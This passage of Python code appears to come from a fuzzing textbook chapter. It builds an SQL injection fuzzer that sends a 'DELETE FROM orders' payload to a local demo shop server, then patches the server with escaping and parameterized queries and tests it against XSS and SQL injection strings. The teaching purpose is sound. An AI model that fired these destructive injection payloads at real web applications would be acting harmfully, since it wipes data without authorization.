    sql_fuzzer = GrammarFuzzer(grammar)
    sql_fuzzer.fuzz()

if __name__ == '__main__':
    print(db.execute("SELECT * FROM orders").fetchall())

if __name__ == '__main__':
    contents = webbrowser(urljoin(httpd_url,
                                  "/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104"))

def orders_db_is_empty():
    try:
        entries = db.execute("SELECT * FROM orders").fetchall()
    except sqlite3.OperationalError:
        return True
    return len(entries) == 0

if __name__ == '__main__':
    orders_db_is_empty()

class SQLInjectionFuzzer(WebFormFuzzer):
    def __init__(self, url, sql_payload="", **kwargs):
        self.sql_payload = sql_payload
        super().__init__(url, **kwargs)

    def get_grammar(self, html_text):
        grammar_miner = SQLInjectionGrammarMiner(
            html_text, sql_payload=self.sql_payload)
        return grammar_miner.mine_grammar()

if __name__ == '__main__':
    sql_fuzzer = SQLInjectionFuzzer(httpd_url, "DELETE FROM orders")
    web_runner = WebRunner(httpd_url)
    trials = 1

    while True:
        sql_fuzzer.run(web_runner)
        if orders_db_is_empty():
            break
        trials += 1

if __name__ == '__main__':
    trials

if __name__ == '__main__':
    orders_db_is_empty()

## Synopsis
## --------

if __name__ == '__main__':
    print('\n## Synopsis')



### Fuzzing Web Forms

if __name__ == '__main__':
    print('\n### Fuzzing Web Forms')



if __name__ == '__main__':
    web_form_fuzzer = WebFormFuzzer(httpd_url)

if __name__ == '__main__':
    web_form_fuzzer.grammar['<start>']

if __name__ == '__main__':
    web_form_fuzzer.grammar['<action>']

if __name__ == '__main__':
    web_form_fuzzer.grammar['<query>']

if __name__ == '__main__':
    web_form_fuzzer.fuzz()

### SQL Injection Attacks

if __name__ == '__main__':
    print('\n### SQL Injection Attacks')



if __name__ == '__main__':
    sql_fuzzer = SQLInjectionFuzzer(httpd_url, "DELETE FROM orders")
    sql_fuzzer.fuzz()

## Lessons Learned
## ---------------

if __name__ == '__main__':
    print('\n## Lessons Learned')



if __name__ == '__main__':
    clear_httpd_messages()

if __name__ == '__main__':
    httpd_process.terminate()

## Next Steps
## ----------

if __name__ == '__main__':
    print('\n## Next Steps')



## Background
## ----------

if __name__ == '__main__':
    print('\n## Background')



## Exercises
## ---------

if __name__ == '__main__':
    print('\n## Exercises')



### Exercise 1: Fix the Server

if __name__ == '__main__':
    print('\n### Exercise 1: Fix the Server')



#### Part 1: Silent Failures

if __name__ == '__main__':
    print('\n#### Part 1: Silent Failures')



BETTER_HTML_INTERNAL_SERVER_ERROR = \
    HTML_INTERNAL_SERVER_ERROR.replace("<pre>{error_message}</pre>", "")

if __name__ == '__main__':
    HTML(BETTER_HTML_INTERNAL_SERVER_ERROR)

class BetterHTTPRequestHandler(SimpleHTTPRequestHandler):
    def internal_server_error(self):
        # Note: No INTERNAL_SERVER_ERROR status
        self.send_response(HTTPStatus.OK, "Internal Error")

        self.send_header("Content-type", "text/html")
        self.end_headers()

        exc = traceback.format_exc()
        self.log_message("%s", exc.strip())

        # No traceback or other information
        message = BETTER_HTML_INTERNAL_SERVER_ERROR
        self.wfile.write(message.encode("utf8"))

#### Part 2: Sanitized HTML

if __name__ == '__main__':
    print('\n#### Part 2: Sanitized HTML')



import html

class BetterHTTPRequestHandler(BetterHTTPRequestHandler):
    def send_order_received(self, values):
        sanitized_values = {}
        for field in values:
            sanitized_values[field] = html.escape(values[field])
        sanitized_values["item_name"] = html.escape(
            FUZZINGBOOK_SWAG[values["item"]])

        confirmation = HTML_ORDER_RECEIVED.format(
            **sanitized_values).encode("utf8")

        self.send_response(HTTPStatus.OK, "Order received")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(confirmation)

#### Part 3: Sanitized SQL

if __name__ == '__main__':
    print('\n#### Part 3: Sanitized SQL')



class BetterHTTPRequestHandler(BetterHTTPRequestHandler):
    def store_order(self, values):
        db = sqlite3.connect(ORDERS_DB)
        db.execute("INSERT INTO orders VALUES (?, ?, ?, ?, ?)",
                (values['item'], values['name'], values['email'], values['city'], values['zip']))
        db.commit()

#### Part 4: A Robust Server

if __name__ == '__main__':
    print('\n#### Part 4: A Robust Server')



class BetterHTTPRequestHandler(BetterHTTPRequestHandler):
    REQUIRED_FIELDS = ['item', 'name', 'email', 'city', 'zip']

    def handle_order(self):
        values = self.get_field_values()
        for required_field in self.REQUIRED_FIELDS:
            if required_field not in values:
                self.send_order_form()
                return

        self.store_order(values)
        self.send_order_received(values)

#### Part 5: Test it!

if __name__ == '__main__':
    print('\n#### Part 5: Test it!')



if __name__ == '__main__':
    httpd_process, httpd_url = start_httpd(BetterHTTPRequestHandler)

if __name__ == '__main__':
    print_url(httpd_url)

if __name__ == '__main__':
    print_httpd_messages()

if __name__ == '__main__':
    standard_order = "/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104"
    contents = webbrowser(httpd_url + standard_order)
    HTML(contents)

if __name__ == '__main__':
    assert contents.find("Thank you") > 0

if __name__ == '__main__':
    bad_order = "/order?item="
    contents = webbrowser(httpd_url + bad_order)
    HTML(contents)

if __name__ == '__main__':
    assert contents.find("Order Form") > 0

if __name__ == '__main__':
    injection_order = "/order?item=tshirt&name=Jane+Doe" + cgi_encode("<script></script>") + \
        "&email=doe%40example.com&city=Seattle&zip=98104"
    contents = webbrowser(httpd_url + injection_order)
    HTML(contents)

if __name__ == '__main__':
    assert contents.find("Thank you") > 0
    assert contents.find("<script>") < 0
    assert contents.find("&lt;script&gt;") > 0

if __name__ == '__main__':
    sql_order = "/order?item=tshirt&name=" + \
        cgi_encode("Robert', 'x', 'x', 'x'); DELETE FROM orders; --") + \
        "&email=doe%40example.com&city=Seattle&zip=98104"
    contents = webbrowser(httpd_url + sql_order)
    HTML(contents)

if __name__ == '__main__':
    assert contents.find("DELETE FROM") > 0
    assert not orders_db_is_empty()

if __name__ == '__main__':
    httpd_process.terminate()

if __name__ == '__main__':
    if os.path.exists(ORDERS_DB):
        os.remove(ORDERS_DB)

### Exercise 2: Protect the Server

if __name__ == '__main__':
    print('\n### Exercise 2: Protect the Server')



#### Part 1: A Blacklisting Filter

if __name__ == '__main__':
    print('\n#### Part 1: A Blacklisting Filter')



#### Part 2: A Whitelisting Filter

if __name__ == '__main__':
    print('\n#### Part 2: A Whitelisting Filter')



### Exercise 3: Input Patterns

if __name__ == '__main__':
    print('\n### Exercise 3: Input Patterns')



### Exercise 4: Coverage-Driven Web Fuzzing

if __name__ == '__main__':
    print('\n### Exercise 4: Coverage-Driven Web Fuzzing')


